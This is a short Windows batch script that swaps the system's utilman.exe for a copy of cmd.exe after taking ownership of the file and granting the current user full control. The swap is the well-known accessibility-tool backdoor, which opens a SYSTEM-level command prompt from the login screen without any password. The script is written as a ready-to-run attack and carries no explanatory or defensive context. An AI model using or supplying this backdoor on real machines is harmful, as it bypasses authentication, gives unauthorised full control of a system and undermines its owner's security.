@echo off

:: Take ownership of the file
takeown /f C:\windows\system32\utilman.exe

:: Grant full control to the current user
icacls C:\windows\system32\utilman.exe /grant %username%:F

:: Backup original utilman.exe
rename "C:\windows\system32\utilman.exe" "C:\windows\system32\utilman_original.exe"

:: Copy cmd.exe to utilman.exe
copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe

echo Operation completed successfully.
pause
